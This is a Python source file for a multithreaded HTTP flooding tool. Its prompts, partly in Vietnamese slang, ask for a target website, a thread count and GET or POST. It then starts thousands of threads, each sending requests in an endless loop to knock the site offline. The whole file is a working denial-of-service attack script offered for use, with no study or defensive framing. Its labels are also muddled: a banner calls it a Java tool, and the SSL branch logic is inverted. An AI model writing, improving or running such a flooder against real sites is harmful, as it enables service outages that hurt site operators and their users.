import requests
import threading
import time 

class Dos(threading.Thread):
    USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
    amount = 0
    url = ""

    def __init__(self, seq, type):
        threading.Thread.__init__(self)
        self.seq = seq
        self.type = type

    def run(self):
        while True:
            if self.type == 1:
                self.postAttack(Dos.url)
            elif self.type == 2:
                self.sslPostAttack(Dos.url)
            elif self.type == 3:
                self.getAttack(Dos.url)
            elif self.type == 4:
                self.sslGetAttack(Dos.url)

    @staticmethod
    def main():
        url = ""
        attakingAmoun = 0
        dos = Dos(0, 0)
        url = input("ENTER WEBSITE(NHAP WEB CAN PEM):")
        print("\n")
        print("CHECKING: " + url)
        SUrl = url.split(":")
        print("BAN TUM LUM ROI")
        if SUrl[0] == "http" or SUrl[0] == "https":
            dos.checkConnection(url)
        else:
            dos.sslCheckConnection(url)
        print("TOOL JAVA DDOS BY HUY CHUA LAM BO")
        amount = input("Thread(default/17000) : ")
        if amount == "" or amount is None:
            Dos.amount = 2000
        else:
            Dos.amount = int(amount)
        option = input("methods(default/80000) : ")
        ioption = 1
        if option.lower() == "get":
            if SUrl[0] == "http" or SUrl[0] == "https":
                ioption = 3
            else:
                ioption = 4
        else:
            if SUrl[0] == "http" or SUrl[0] == "https":
                ioption = 1
            else:
                ioption = 2
        time.sleep(2)
        print("OOOOO BAN TUM LUMMM")
        threads = []
        for i in range(Dos.amount):
            t = Dos(i, ioption)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print("HẾT CỨUUU(main threads dead)")

    def checkConnection(self, url):
        print("Checking Connection")
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        if response.status_code == 200:
            print("Connected to website")
        Dos.url = url

    def sslCheckConnection(self, url):
        print("Checking Connection (ssl)")
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        if response.status_code == 200:
            print("Connected to website")
        Dos.url = url

    def postAttack(self, url):
        response = requests.post(url, headers={"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en;"}, data="out of memory")
        print("POST Attack: " + str(response.status_code) + "Thread: " + str(self.seq))

    def getAttack(self, url):
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        print("GET Attack: " + str(response.status_code) + "Thread: " + str(self.seq))

    def sslPostAttack(self, url):
        response = requests.post(url, headers={"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en;"}, data="out of memory")
        print("GET Attack :" + str(response.status_code) + "Thread: " + str(self.seq))

    def sslGetAttack(self, url):
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        print("GET Attack : " + str(response.status_code) + "Thread: " + str(self.seq))

if __name__ == "__main__":
    Dos.main()


